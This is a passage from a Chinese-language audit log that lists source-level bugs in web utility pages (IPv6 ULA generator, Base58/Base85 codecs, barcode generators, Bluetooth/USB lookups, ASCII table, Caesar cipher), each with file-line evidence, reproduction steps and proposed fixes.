- 证据：`tools/it/ipv6-ula.html:227`（`1111 1101 0`）、`tools/it/ipv6-ula.html:369`（"48 位全局 ID"）、`tools/it/ipv6-ula.html:177`（正确的 8+40+16+64）
- 复现：阅读结果说明 → "1111 1101 0 + 40 位"合计 49 位，与"共 128 位"及 40 位全局 ID 矛盾。
- 影响：教学性文案自相矛盾，用户按位理解前缀结构时会被误导。
- 方案：改为"`fd` = 二进制 `1111 1101`（8 位），其中 L 位为 1"；deep-dive 改"40 位全局 ID"。

### IT-N116 IPv6 ULA 生成器：结果区没有复制按钮，前缀只能手工选中（低，确认源码缺陷）
- 问题：工具栏只有"计算 / 导出明细 CSV / 重置"，结果 `<pre>` 无"复制前缀"或"复制全部"按钮；导出的 CSV 是历史表而非本次前缀清单。
- 证据：`tools/it/ipv6-ula.html:122-125`（工具栏）、`tools/it/ipv6-ula.html:224`（结果拼接）、`tools/it/ipv6-ula.html:326-327`（导出历史表）
- 复现：生成 3 条后想把 `/48` 前缀粘到路由器配置 → 只能手动拖选 `<pre>` 文本；点"导出明细 CSV"得到的是历史记录（时间/数量/结果摘要），不含分行前缀。
- 影响：核心产物（前缀）不可一键取用，移动端尤其难操作。
- 方案：结果区加"复制全部/逐行复制"按钮（`ToolBox.copyText`）；导出改为本次生成的 `前缀,示例地址` 两列 CSV。

- 留存建议（ipv6-ula）：①增加"固定前缀 + 子网 ID 位数"可配置（当前子网恒为 0）；②支持生成多子网（`/48` → 多个 `/64`）与 JSON/CSV 清单导出；③提供"复制 curl/配置片段"（如 `ip -6 addr add`）。

- 备注：`tools/it/mime-type.html:368` 与 `tools/it/base32-encode.html:309` 的复制按钮仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效，与 IT-N31 同模式），不重复计数、未单列。
- 本轮实读 8 页：`tools/it/ipv6-ula.html`、`tools/it/ssl-info.html`、`tools/it/http-status.html`、`tools/it/http-headers.html`、`tools/it/mime-type.html`、`tools/it/aes-encryptor.html`、`tools/it/rsa.html`、`tools/it/base32-encode.html`；新增 31 条（高 2 / 中 17 / 低 12）；未覆盖：本分区其余非文本页（`base58-encode`、`base85-encode`、`http-methods`、`gitignore-generator`、`dockerfile-generator`、`shell-script-formatter`、`aes/des/ecdsa` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 P）

范围：只读实读 8 页（`tools/it/base58-encode.html`、`base85-encode.html`、`barcode-code128.html`、`barcode-upc.html`、`bluetooth-version.html`、`usb-version.html`、`ascii-table.html`、`caesar-cipher.html`），编号接续 IT-N117。所有数值结论均用 `node -e` 按页面源码逻辑（或 `/js/barcode-lib.js`）复算；未开浏览器、未跑构建/门禁、未做 EN/繁体/移动端验证。上一轮已记入 IT-N110/111/112 的 Base32 同型问题不作为本轮重复项。

### IT-N117 Base58 编解码：历史、数据表、趋势图、导出全为空壳（读 textarea 的 textContent 恒为空）（中，确认源码缺陷）
- 问题：`__base58_encodeResText()` 读 `#output` 的 `textContent`，而结果写的是 `.value`；空的 `<textarea>` 其 `textContent` 永远是空串 → `__base58_encodeExtras()` 在 `if(!res) return;` 处直接返回，`TBKit.history.record` 从不执行，`__base58_encodeRender()` 也从不运行。
- 证据：`tools/it/base58-encode.html:177`（空的 `<textarea id="output" readonly>`）、`tools/it/base58-encode.html:364-367`（读 `r.textContent`）、`tools/it/base58-encode.html:421-422`（`if(!res) return`）、`tools/it/base58-encode.html:440-445`（record/Render/Export 全依赖上一步）
- 复现（静态可判）：编码 `Hello` → 输出 `9Ajdvzr`；切"数据表"页签无任何行；点"导出明细 CSV"无文件、无提示（期望至少一行"输入/字母表/结果"并可导出）。
- 影响：四个留存相关页签（图表/数据表/预设/历史）中的图表与数据表恒空，导出功能等于失效；解码 `dec()` 也未包装，历史永远缺解码记录。
- 方案：改读 `.value`；同时包装 `dec()` 并把 `variant` 与"方向"写入记录；补编码/解码两条历史用例。

### IT-N118 Base58 编解码：deep-dive 示例输出错误（`Hello World` 实际为 `JxF12TrwUP45BMd`）（中，确认源码缺陷）
- 问题：示例声称 `Hello World` → `2NEwd2UZ`，与页面自身算法结果不符；且 `2NEwd2UZ` 长度 8 也短于 11 字节原文的合理编码长度（11 字节 → 约 16 个 Base58 字符）。
- 证据：`tools/it/base58-encode.html:212`（示例）；算符见 `tools/it/base58-encode.html:262-283`
- 复现（Node 复算页内 `encodeBase58`）：`Hello World`（11 字节）→ 实际 `JxF12TrwUP45BMd`；`Hello`（5 字节）→ `9Ajdvzr`。期望示例与真实输出一致。
- 影响：用户照示例核对会以为工具算错，降低可信度；示例是本页唯一的"可验证样例"。
- 方案：把示例改为 `Hello World → JxF12TrwUP45BMd`（Bitcoin 字母表），并注明字母表；同时给 Ripple/Flickr 各一条真实样例。

### IT-N119 Base58 编解码：只支持文本（UTF-8），与 meta"输入文本或字节"不符；二进制解码静默变 U+FFFD（低，确认源码缺陷）
- 问题：页面输入是单个 `<textarea>`，编码固定 `new TextEncoder().encode(text)`、解码固定 `new TextDecoder().decode(bytes)`；没有字节/十六进制输入，也没有字节输出。非 UTF-8 的 Base58 载荷（如比特币原始公钥）解码后会被替换为 `U+FFFD`，且无任何提示。
- 证据：`tools/it/base58-encode.html:10`（meta"输入文本或字节"）、`tools/it/base58-encode.html:174`（唯一文本输入）、`tools/it/base58-encode.html:314`、`tools/it/base58-encode.html:321`
- 复现：把字节序列 `[0x80, 0xFF]` 按页内 `encodeBase58()` 编成 Base58 再粘回解码 → 实际输出两个 `�`（U+FFFD），无"非文本数据"提示（`TextDecoder` 静默替换非法字节）。期望：提供 hex/字节视图或明确拒绝。
- 影响：把二进制当文本处理会静默损坏数据，与 meta 承诺不符。
- 方案：增加"文本 / Hex 字节"输入切换，解码输出同时给 UTF-8 文本与 hex；若不做，删掉 meta 中的"或字节"。

- 留存建议（base58-encode）：①补"文本 / Hex 字节"双模式，真正兑现 meta；②结果区显示字符数与字节数；③支持 Base58Check（双 SHA-256 前 4 字节）校验，或明确标注"仅纯 Base58、不校验地址"。

### IT-N120 Base85 编解码："Z85"预设必然报错（`ZeroMQ Z85` 为 10 字节，非 4 的倍数）（中，确认源码缺陷）
- 问题：预设 `Z85` 把输入设为 `ZeroMQ Z85`（10 字节），而 `encodeZ85()` 开头硬性要求字节数为 4 的倍数并抛错；点击该预设只会弹出"编码失败：Z85 编码要求字节数为 4 的倍数"，输出保持旧值。
- 证据：`tools/it/base85-encode.html:484`（预设值）、`tools/it/base85-encode.html:309-310`（`bytes.length % 4 !== 0` 抛错）
- 复现（Node 复算）：`node -e "console.log(new TextEncoder().encode('ZeroMQ Z85').length%4)"` → `2`；因此 `Z85` 预设 100% 失败。期望预设改用 8/12 字节样例（如 `ZeroMQ!!` 8 字节）或自动补位。
- 影响：三种变体里的 Z85 无法通过预设体验，用户会误以为 Z85 模式坏了。
- 方案：预设改 `ZeroMQ!`（8 字节）等 4 倍数样例；或在 UI 提示"Z85 需 4 字节对齐"并禁用不合规预设。

### IT-N121 Base85 编解码：两个解码器都不校验 5 字符组的数值上限（85⁵ > 2³²），非法组静默产出错误字节（中，确认源码缺陷）
- 问题：`decodeZ85()` 把 5 个字符累加成 `n` 后直接用 `n >>> 24` 等按 32 位截断；`decodeAscii85()` 同样不校验 `n ≤ 0xFFFFFFFF`。而 85⁵−1 = 4437053124 > 4294967295，规范要求该组非法。超出上限的组不会被拒绝，而是按 `n mod 2³²` 输出字节。
- 证据：`tools/it/base85-encode.html:334-336`（累加后直接位运算）、`tools/it/base85-encode.html:284-296`（Ascii85 同样无上限校验）
- 复现（Node 复算页内函数）：`decodeZ85('#####')` → 实际 `08 78 0e c4`，无异常；`decodeAscii85('<~uuuuu~>')` → 同样 `08 78 0e c4`。该组十进制值 4437053124 > 2³²−1，期望抛"非规范 Base85 组"。
- 影响：截断/篡改的 Base85 被当成合法数据解码，输出看似正常但语义错误（用于二进制载荷时不可察觉）。
- 方案：累加后 `if(n > 0xFFFFFFFF) throw new Error('非规范组')`；Ascii85 同理；补 `#####`/`uuuuu` 两条负例。

### IT-N122 Base85 编解码：deep-dive 示例少写一个字符（实际 `<~87cURDZ~>`）（低，确认源码缺陷）
- 问题：示例称 `Hello` → `<~87cURD~>`，但 `Hello` 的 5 字节应编为 5+2=7 个 payload 字符；页面实现实际输出 `<~87cURDZ~>`（8 字符）。
- 证据：`tools/it/base85-encode.html:220`（示例）；算法见 `tools/it/base85-encode.html:264-282`
- 复现（Node 复算页内 `encodeAscii85`）：`Hello` → `<~87cURDZ~>`；示例值 `<~87cURD~>` 无法被本页解码回 `Hello`（缺 `Z` 时解出 `Hell`）。
- 影响：示例与实现不一致，用户复制示例去解码会得到 `Hell`。
- 方案：改为 `<~87cURDZ~>`；建议示例同时给出"输入/输出/可逆验证"三行。

### IT-N123 Base85 编解码：引据写 RFC 1924（其字符表与本页两种变体都不同），且 formula-list 声称支持 `y` 但实现没有（低，确认源码缺陷）
- 问题：本页只实现 Adobe Ascii85（`!`~`u` + `z`）与 ZeroMQ Z85；RFC 1924 的 Base85 字母表是另一套（`0-9A-Za-z!#$%&()*+-;<=>?@^_`{|}~`），既非 Ascii85 也非 Z85。另 formula-list 写"`y` 用于特定历史情形"，但 `decodeAscii85()` 遇到 `y`（码值 88 > 84）直接抛"非法字符"。
- 证据：`tools/it/base85-encode.html:160`（`y` 的说法）、`tools/it/base85-encode.html:243-244`（RFC 1924 引据）、`tools/it/base85-encode.html:295`（`c > 84` 抛错）
- 复现：解码 `y` 开头的组 → 实际"非法字符: y"；期望要么支持（btoa 扩展把 `y` 视为 4 个空格），要么在说明中不要声称支持。
- 影响：引据不可核、说明与行为不符，教学场景易误导。
- 方案：引据改为 Adobe PostScript Language Reference（Ascii85）与 ZeroMQ RFC 32/Z85；删除 `y` 说法或实现 `y`→4 空格。

- 留存建议（base85-encode）：①Z85 预设改为 4 字节对齐样例并显示对齐要求；②解码加组值上限与非规范组报错；③结果区显示"字符数 / 膨胀率"并支持 `<~ ~>` 可选开关。

### IT-N124 Code128 条形码：宣称支持全部 ASCII 0–127，但"可打印 + 控制字符"混合输入被拒（中，确认源码缺陷）
- 问题：`code128Encode()` 的子集选择是"整串只能落在一个区间"：纯偶数位数字→C；整串都在 32–127→B；整串都在 0–95→A；否则报"仅支持 ASCII 0~127"。因此 `a\x01`（97 与 1，均在 0–127 内）被拒绝，但正确做法是 B→A 切换（或 A→B），Code 128 本身完全支持。
- 证据：`js/barcode-lib.js:65-79`（三段互斥判断与错误文案）、`tools/it/barcode-code128.html:192`（deep-dive"支持全部 128 个 ASCII 字符"）
- 复现（Node 调 `ToolBoxBarcode.code128`）：`A\x01` → ok（subset A）；`a\x01` → 实际 `ERR: Code 128 仅支持 ASCII 0~127…`，但该串每个字符都在 0–127 内。期望成功编码（B + Code A 切换）。
- 影响：含控制字符的混合串（如 ESC/POS 指令、带制表符的字段）无法生成条码，且错误文案把"实现限制"说成"字符集限制"。
- 方案：实现 A/B/C 动态切换（至少 B↔A 一次切换），或把文案改为"暂不支持跨可打印/控制区间的混合内容"；补 `a\x01` 用例。

### IT-N125 Code128 条形码：空输入被 `|| ' '` 吞掉，静默生成"空格"条码（低，确认源码缺陷）
- 问题：`generate()` 用 `B.encode('code128', text || ' ')`，空输入被替换成一个空格，编码库的"请输入条码内容"错误永远不会触发；结果区显示一个 legit 但无意义的条码。
- 证据：`tools/it/barcode-code128.html:265-266`（`text || ' '`）、`js/barcode-lib.js:63`（空串本应报错）
- 复现：清空输入框后点"生成" → 实际渲染空格条码（文本区显示 ` · Code B · 1 个符号 · 校验位 …`）；期望提示"请输入条码内容"。
- 影响：空标签被当成有效条码打印/下载，扫码结果为空格。
- 方案：去掉 `|| ' '`，改为 `if(!text.trim()){ 行内提示; return; }`。

### IT-N126 Code128 条形码：引据表把符号结构写成"3 条 2 空"，与自身公式"3 条 3 空"矛盾（低，确认源码缺陷）
- 问题：Code 128 每个符号 11 模块由 3 条 + 3 空共 6 个元素构成；formula-desc 写"3 条 3 空"正确，但底部引据表写"每字符 11 模块，含 3 条 2 空"（英文 "3 bars + 2 spaces"）。
- 证据：`tools/it/barcode-code128.html:158`（正确说法）、`tools/it/barcode-code128.html:228`（引据表错误说法）
- 复现：阅读同页两处说明 → 元素数 6 vs 5 自相矛盾；按"3 条 2 空"无法凑出 11 模块的合法符号。
- 影响：教学性引据错误，读者按此理解符号结构会出错。
- 方案：改为"3 条 3 空（6 元素，11 模块）"。

- 留存建议（code128-encode）：①实现 A/B/C 动态切换并显示切换点；②增加 SVG 导出与静区宽度提示（当前仅 PNG 且 quiet 固定 10）；③补 FNC1/GS1-128 的"暂不支持"明示，避免 deep-dive 提及但工具无入口。

### IT-N127 UPC 条形码：本地 `buildUPC` 静默补零/截断，空输入与纯字母生成全零条码（中，确认源码缺陷）
- 问题：页面没有加载共享库，自己实现 `buildUPC()`：`d.length<11` 时用 `padEnd(11,'0')` 补零，`>=12` 时 `slice(0,12)` 截断，且先 `replace(/\D/g,'')` 吞掉非数字；因此任意短输入都会被"补成"另一个商品码，空输入/纯字母得到全零码。
- 证据：`tools/it/barcode-upc.html:252-263`（254 补零、256 截断）、`tools/it/barcode-upc.html:290-292`（无校验直接绘制）、对比 `js/barcode-lib.js:156-166`（共享库 `upcaEncode` 对非 11/12 位直接报错）
- 复现（Node 复算页内函数）：`123` → 实际 `123000000006`（期望报"需要 11 或 12 位"）；`''`/`abc` → 实际 `000000000000`；`1234567890123` → 实际 `123456789012`。
- 影响：用户输入 3 位内部编号即得到一条"合法但错误"的 UPC，打印后扫出的是另一个商品；全零码更是明显的无效标签。
- 方案：直接复用 `/js/barcode-lib.js` 的 `upca`（已含位数/校验位校验）；或本地补 `length!==11 && length!==12 → 报错`，禁止补零/截断。

### IT-N128 UPC 条形码：12 位输入不校验第 12 位，错误校验位照常渲染（中，确认源码缺陷）
- 问题：`buildUPC()` 只在长度恰好 11 时补校验位；长度 12 时原样使用，不比较 `upcCheck(d.slice(0,11))` 与第 12 位。
- 证据：`tools/it/barcode-upc.html:255-256`（仅补位与截断，无校验分支）；对照 `js/barcode-lib.js:160-164`（共享库会返回"第 12 位校验位应为 2"）
- 复现（Node 复算）：`036000291451`（正确应为 `…2`）→ 实际原样渲染 `036000291451`，无任何提示；期望报错并提示正确校验位 2。
- 影响：供应商标签验收、手工改码时，错误校验位不会被发现，扫码枪按 GS1 规则会拒读。
- 方案：长度 12 时校验末位，不符则行内报"校验位应为 X"；或直接换用共享库。

### IT-N129 UPC 条形码：条码下方数字未按标准把首位数字印在左静区，与自身引据"first digit in left quiet zone"矛盾（低，确认源码缺陷）
- 问题：`drawBarcode()` 只在条码下方居中打印 `digits.slice(0,6)` 与 `digits.slice(6)`，首位（数字系统字符）混在左侧 6 位里，未单独放在左静区；引据表却写"首位数字印于左静区"。
- 证据：`tools/it/barcode-upc.html:275-276`（两组文字定位）、`tools/it/barcode-upc.html:222`（引据）
- 复现：生成 `036000291452` → 实际下方为 `036000`（含首位 0）与 `291452`；期望左静区单印 `0`，下方两组为 `360002` / `91452`。
- 影响：人眼核对与标准标签不一致，验收时易误判。
- 方案：把首位单独 `fillText` 在左静区（x≈0），两组按 `digits.slice(1,7)` / `slice(7)` 定位。

- 留存建议（barcode-upc）：①删除本地 `buildUPC`，统一走共享库；②非法输入改行内红色提示（当前无任何错误通道）；③补 UPC-E 互转/校验位自动纠正说明，兑现 FAQ 的 UPC-E 提及。

### IT-N130 蓝牙版本速查：三个下拉框没有任何 `<option>`，版本/对比版本/场景完全无法选择（高，确认源码缺陷）
- 问题：`#v`、`#v2`、`#scene` 都是空 `<select>`；全页既无 `<option>` 标记，也无 `new Option`/`appendChild` 之类的填充代码。`calcTool()` 只能拿到空值，靠 `|| '5.3'`、`|| '5.0'`、`|| 'audio'` 兜底，页面展示的永远是"5.3 vs 5.0 + audio 场景"这一组默认结果。
- 证据：`tools/it/bluetooth-version.html:129`、`tools/it/bluetooth-version.html:133`、`tools/it/bluetooth-version.html:137`（三个空 select）、`tools/it/bluetooth-version.html:271-273`（读值 + 兜底）、`tools/it/bluetooth-version.html:308-310`（`resetForm` 对空 select 置 `selectedIndex=0` 实为 −1）
- 复现（Node 静态校验）：`<select id="v">`、`<select id="v2">`、`<select id="scene">` 内部文本长度均为 0，全页 `<option` 计数为 0，`appendChild`/`new Option` 计数也为 0；因此打开页面三个下拉均无项，换任何操作结果都不变。期望至少 6 个版本项（4.2/5.0/5.1/5.2/5.3/5.4）与 3 个场景项（audio/iot/peripheral）。
- 影响：核心交互（选版本、选场景做对比）完全不可用，页面退化为固定的一张默认结果卡；这也解释了为什么"计算"按钮看起来没有反应。
- 方案：在 boot 时用 `info` 表的 key 生成 `#v`/`#v2` 的 option，场景用固定 `audio/iot/peripheral` 生成 `#scene`；或直接在 HTML 写死 `<option>`，避免再次漏项。

### IT-N131 蓝牙版本速查：数据表只覆盖 4.2~5.4，未命中静默回退 5.3/5.0（补齐下拉后会显示错误对比数据）（中，确认源码缺陷）
- 问题：`info` 只有 `4.2/5.0/5.1/5.2/5.3/5.4`，缺 1.x/2.x/3.0/4.0/4.1；`row=info[v]||info['5.3']`，一旦选项里出现 4.0/4.1，页面会显示"Bluetooth 4.0"标题却配 5.3 的 2 Mbps 与"连接子评级"特性，且无提示。
- 证据：`tools/it/bluetooth-version.html:274-281`（info 表）、`tools/it/bluetooth-version.html:282`（静默回退）、`tools/it/bluetooth-version.html:114`（公式区自述回退规则）
- 复现（Node 复算映射）：`v='4.0', v2='4.2'` → 实际 `2 Mbps / 2 Mbps`、特性"连接子评级、周期广播改进"（均为 5.3 的内容）；期望 4.0 显示 1 Mbps（BLE）且标注"无 2M PHY"。
- 影响：当前因下拉为空暂时不可见，但一旦按 N130 补选项即暴露"张冠李戴"的对比结论，属于高风险的潜在数据错误。
- 方案：补齐 1.x~4.1 行；对未覆盖版本显示"暂无数据"而不是回退；回退时在结果区标注"未收录，按 5.3 代替"。

### IT-N132 蓝牙版本速查：meta/og/twitter/JSON-LD 描述整句重复两遍（低，确认源码缺陷）
- 问题：description 写成"蓝牙版本速查是一款免费的在线IT 开发工具，蓝牙版本速查是一款免费的在线IT 开发工具，输入参数即可实时得出结果；纯前端运行、数据不上传…纯前端运行、数据不上传…"，同句重复。
- 证据：`tools/it/bluetooth-version.html:13`、`tools/it/bluetooth-version.html:16`、`tools/it/bluetooth-version.html:33`、`tools/it/bluetooth-version.html:36`
- 复现：查看页面源码或搜索结果摘要 → 同句连续出现两次；期望单次且语义完整（本页是速查表，不应写"输入参数即可实时得出结果"）。
- 影响：搜索结果摘要冗长且像机器拼接，降低点击率；与同批 usb-version 的正常文案不一致，说明是单页模板污染。
- 方案：改为"蓝牙 5.4/5.3/5.2/5.1/5.0/4.2 的速率、距离、LE Audio 与 AoA/AoD 特性对照速查"。

- 留存建议（bluetooth-version）：①选项由数据表 key 驱动生成（根治空下拉）；②补齐 1.x/2.x/3.0/4.0/4.1 或对未收录版本明确提示；③"数据表"页签当前切换的是 `#result` 而非 `#bluetooth_versionTable`，建议改为真正的表格面板。

### IT-N133 USB 版本速查：三个下拉框没有任何 `<option>`，版本/对比版本/接口类型完全无法选择（高，确认源码缺陷）
- 问题：`#v`、`#v2`、`#conn` 均为空 `<select>`，全页无 `<option>`、无动态填充；`calcTool()` 依赖 `|| '3.2'`、`|| '2.0'`、`|| 'usbc'` 兜底，结果永远是"3.2 vs 2.0 + USB-C"。
- 证据：`tools/it/usb-version.html:129`、`tools/it/usb-version.html:133`、`tools/it/usb-version.html:137`（空 select）、`tools/it/usb-version.html:271-273`（读值 + 兜底）、`tools/it/usb-version.html:307-309`（reset 置 −1）
- 复现（Node 静态校验）：`<select id="v">`、`<select id="v2">`、`<select id="conn">` 内部文本长度均为 0，全页 `<option` 计数为 0，`appendChild`/`new Option` 计数也为 0；打开页面三个下拉均无项，点"计算"结果不变。期望至少 2.0/3.0/3.1/3.2/4.0 与 usbc/typea/micro。
- 影响：与蓝牙页同型——核心选择器不可用，工具只剩一张固定默认结果。
- 方案：boot 时按 `info` 的 key 生成 option，接口类型用固定三项；HTML 亦可直接写死。

### IT-N134 USB 版本速查：数据表缺 1.0/1.1（图表与页内表格却有），回退 3.2/2.0；`connNote` 把 USB 2.0 + USB-C 判成"仅承载较低速率"（中，确认源码缺陷）
- 问题：`info` 只有 `2.0/3.0/3.1/3.2/4.0`，缺 1.0/1.1；`row=info[v]||info['3.2']` 会把 1.x 显示成 3.2 的 20 Gbps。另 `connNote.usbc = parseFloat(v)>=3.1 ? '支持全速率' : 'USB-C 仅承载较低速率'`：接口形态并不限制速率，USB 2.0 的 USB-C 口也能跑满 480 Mbps，"仅承载较低速率"表述错误；同法 `typea`/`micro` 的数值门槛也与事实不符（Micro-B 也有 USB 3.0 版本）。
- 证据：`tools/it/usb-version.html:274-281`（info 表与回退）、`tools/it/usb-version.html:282`（connNote）、`tools/it/usb-version.html:363-364`（图表却含 1.1/12 Mbps）
- 复现（Node 复算）：`v='1.1'` → 实际 20 Gbps / USB-C / 240W（均为 3.2 行）；`v='2.0', conn='usbc'` → 实际"USB-C 仅承载较低速率"，期望"USB-C 形态不限制速率，受协议/线材约束"。
- 影响：补选项后会把 1.1 说成 20 Gbps；接口建议把形态与协议混为一谈，选型结论可能相反。
- 方案：补齐 1.0/1.1 行；未收录显示"暂无数据"；`connNote` 改为"Type-C 支持最高 240W 供电（PD 3.1），速率取决于协议与线材"等不依赖版本门槛的表述。

### IT-N135 USB 版本速查：把 3.1 简写成 10 Gbps，与自身引据"3.0/3.1 已更名为 3.2 Gen1/Gen2"矛盾（低，确认源码缺陷）
- 问题：`info['3.1']=['10 Gbps',…]` 与底部说明"3.1 10G"把 USB 3.1 等同于 Gen2；但 USB-IF 命名里 3.1 Gen1 仍是 5 Gbps，只有 Gen2 是 10 Gbps；引据表也写"3.0 and 3.1 were renamed to 3.2 Gen1 and Gen2"。
- 证据：`tools/it/usb-version.html:276-277`（3.1=10 Gbps）、`tools/it/usb-version.html:228`（"3.1 10G"）、`tools/it/usb-version.html:213`（引据）
- 复现：阅读同页"命名演进"引据与 3.1 行 → 无法解释 3.1 Gen1（5 Gbps）落在哪一行；期望标注 "3.1 Gen1 = 5 Gbps / Gen2 = 10 Gbps"。
- 影响：选购扩展坞/硬盘盒时按"3.1=10G"预期，买到 Gen1 实际只有 5 Gbps。
- 方案：拆成 `3.1 Gen1 (5 Gbps)` 与 `3.1 Gen2 (10 Gbps)`，或统一改用 3.2 Gen1/Gen2/Gen2x2 命名并保留旧名括注。

- 留存建议（usb-version）：①option 由数据表驱动生成；②补 1.0/1.1 与 3.2 Gen1/Gen2/2x2 细分；③接口建议与协议速率解耦（形态≠速率），并把"数据表"页签指向真正的表格。

### IT-N136 ASCII 码表：meta 三处承诺"点击即可复制对应编码"，实际点击只弹详情、没有任何剪贴板调用（中，确认源码缺陷）
- 问题：卡片 `onclick="showDetail(${i})"` 只更新详情面板；全页检索无 `navigator.clipboard`、无 `copy`、无"复制"按钮/提示。meta/og/twitter 三处却都写"点击即可复制对应编码"。
- 证据：`tools/it/ascii-table.html:10`、`tools/it/ascii-table.html:15`、`tools/it/ascii-table.html:76`（三处承诺）、`tools/it/ascii-table.html:302`（仅 `showDetail`）、`:310-324`（详情渲染，无复制）
- 复现：点 65 号卡片 → 实际只有详情面板变化（字符/十进制/十六进制/八进制/二进制/HTML 实体/URL 编码），剪贴板不变、无 toast；期望按 meta 复制编码（如 `65` 或 `0x41`）。
- 影响：核心卖点缺失，用户需手工拖选；SEO 描述与实际功能不符。
- 方案：`showDetail()` 末尾调用 `navigator.clipboard.writeText(...)` 并 toast，或每张卡片加独立"复制"按钮（复制 `0x41`）。

### IT-N137 ASCII 码表："扩展 (128-255)"页签按 Unicode 码点渲染，与 FAQ"128–255 各家不兼容、需查 Unicode"自相矛盾（中，确认源码缺陷）
- 问题：`render()` 对 128–255 用 `String.fromCharCode(i)`（即 U+0080~U+00FF），128–159 显示 `·`，160–255 显示 Latin-1 字符；这不是任何"扩展 ASCII 代码页"（Windows-1252 在 128–159 有 €、™ 等，与 Latin-1 控制区完全不同）。FAQ 却回答"128–255 属于扩展 ASCII（各家互不兼容）…需查 Unicode 码表"。
- 证据：`tools/it/ascii-table.html:172`（扩展页签）、`tools/it/ascii-table.html:292-297`（`fromCharCode` 与 `i>127&&i<161 → '·'`）、`tools/it/ascii-table.html:226`（FAQ 说法）
- 复现：切"扩展 (128-255)" → 128–159 全部显示 `·`，160 起显示 `¡¢£…`（Latin-1）；点 128 号 → 详情显示原始控制字符（不可见）。期望要么移除该页签，要么标注"Latin-1 参考，非扩展 ASCII"。
- 影响：用户把 Latin-1 当作"扩展 ASCII"，在 Windows-1252 环境（€ 在 0x80）下得到错误映射。
- 方案：页签改为"Latin-1 (ISO-8859-1) 参考"并注明 128–159 为控制区；或提供 Latin-1 / Windows-1252 双选项并显示对应字符。

### IT-N138 ASCII 码表：分类页签边界与标签错位（"控制 0-31"实际含 32，"可打印 32-127"实际含 127/DEL）（低，确认源码缺陷）
- 问题：`getRange()` 返回 `[0,32]`（右开，含 32 空格）与 `[32,128]`（含 127 DEL）；按钮却写"控制字符 (0-31)"、"可打印 (32-127)"，FAQ 与 formula-list 又写"32–126 为可打印"。
- 证据：`tools/it/ascii-table.html:170-171`（按钮标签）、`tools/it/ascii-table.html:281-286`（区间）、`tools/it/ascii-table.html:159`、`:225`（"32–126 可打印"）
- 复现：点"控制字符 (0-31)" → 实际末尾出现 32 `␣`；点"可打印 (32-127)" → 实际末尾出现 127 `DEL`（应为控制字符）。期望 0–31、32–126 两区间严格对应。
- 影响：分类边界错位，按"可打印"筛选时会混入 DEL，复制/比对时产生不可见字符。
- 方案：改为 `[0,32)`、`[32,127)`，按钮标签同步为 "0-31" / "32-126"。

- 留存建议（ascii-table）：①实现真正的点击复制（编码或字符二选一，带 toast）；②扩展区改标 Latin-1/Windows-1252 并给映射来源；③补"输入任意字符反查码点"与可打印/控制统计。

### IT-N139 凯撒密码：关闭"仅字母移位"时解密仍按 mod 26 取反向位移（应 mod 95），加解密不可逆（高，确认源码缺陷）
- 问题：`caesarShift()` 先算 `dir = (26 - s) % 26`，再在 `onlyAlpha=false` 分支用 `(code-32+dir)%95+32`；加密用 `+s mod 95`、解密用 `+(26-s) mod 95`，两者合计 26 而非 95 的倍数，无法还原。所有 1–25 位移都错（净偏移恒为 26）。
- 证据：`tools/it/caesar-cipher.html:343-344`（方向计算）、`tools/it/caesar-cipher.html:353-361`（mod 95 分支）、`tools/it/caesar-cipher.html:374`（解密调用）
- 复现（Node 复算页内函数，`onlyAlpha=false, preserveCase=true`）：`Hello, World! 2024` shift 3 加密 → `Khoor/#Zruog$#5357`；再以 shift 3 解密 → 实际 `b ''*F:q*-'~;:LJLN`（期望还原 `Hello, World! 2024`）。`Hello` shift 13 → `Uryy|`，解密 → `b ''*`。
- 影响：一旦取消勾选"仅字母移位"，解密/暴力破解全部输出乱码，用户会以为密文损坏；这也是本页第二个模式的核心功能。
- 方案：按字母表大小取逆：`const base = onlyAlpha ? 26 : 95; const dir = encrypt ? s % base : (base - s % base) % base;`；补 `onlyAlpha=false` 的加解密往返用例（至少 shift 3/13/25）。

### IT-N140 凯撒密码：TBKit 数据表/趋势图/导出 CSV 恒为空（`__caesar_cipherResText` 读 textarea 的 textContent）（中，确认源码缺陷）
- 问题：结果写入 `#output.value`，而 `__caesar_cipherResText()` 读 `#output.textContent`（空 textarea 恒为空）→ `__caesar_cipherExtras()` 在 `if(!res) return` 处退出，`TBKit.history.record` 与 `__caesar_cipherRender` 从不执行。
- 证据：`tools/it/caesar-cipher.html:195`（空 `<textarea id="output">`）、`tools/it/caesar-cipher.html:573-579`（读 textContent）、`tools/it/caesar-cipher.html:630-631`（`if(!res) return`）、`tools/it/caesar-cipher.html:652-655`（导出依赖空表）
- 复现：加密 `Hello` → 输出 `Khoor`；切 TBKit 历史/查看数据表 → 无记录；点"导出明细 CSV"无文件无提示。期望一行"输入/移位/模式/结果"并可导出。
- 影响：与页面自带的 localStorage 历史并存但完全空转，用户看到两套历史、其中一套永远空；CSV 导出是死按钮。
- 方案：改读 `.value`；包装 `process()` 而非仅 `setMode()` 触发 extras；导出改为本次结果而非历史表。

### IT-N141 凯撒密码：`oninput` 每次按键都写 localStorage，20 条上限被同一段输入的前缀刷满（中，确认源码缺陷）
- 问题：`<textarea id="input" oninput="process();">`，`process()` 无条件 `saveHistory(input, result, …)`；`saveHistory` 只与"最新一条"去重，不防抖，因此输入 `Hello` 会依次落下 `H`、`He`、`Hel`、`Hell`、`Hello` 5 条记录。
- 证据：`tools/it/caesar-cipher.html:191`（`oninput`）、`tools/it/caesar-cipher.html:376`（无条件 save）、`tools/it/caesar-cipher.html:458-475`（仅与首条比较）、`tools/it/caesar-cipher.html:312`（`MAX_HISTORY=20`）
- 复现：清空历史后逐字输入 `Hello` → 实际历史 5 条（每条都是前缀）；20 字符的输入即可占满全部容量，真实历史被挤出。
- 影响：历史功能基本不可用，且每次按键同步写 localStorage（长文本输入有卡顿风险）。
- 方案：改为失焦/点击按钮/500ms 防抖后写入；`MAX_HISTORY` 提到 50 或按"完整输入"去重（同一 session 只留最终值）。

### IT-N142 凯撒密码：TBKit 历史回填调用 `setMode()` 无参 → `currentMode=undefined`、标签变"密文/破解结果"、按解密重算（低，确认源码缺陷）
- 问题：`TBKit.history.mount` 的回填回调末尾调用 `setMode()`（无参数），函数内 `currentMode = mode` 即 `undefined`；随后三个按钮全部取消 active，`inputLabel` 走 else 分支变"密文"、`outputLabel` 变"破解结果"，`process()` 里 `encrypt = currentMode==='encrypt'` 为 false，按解密计算。
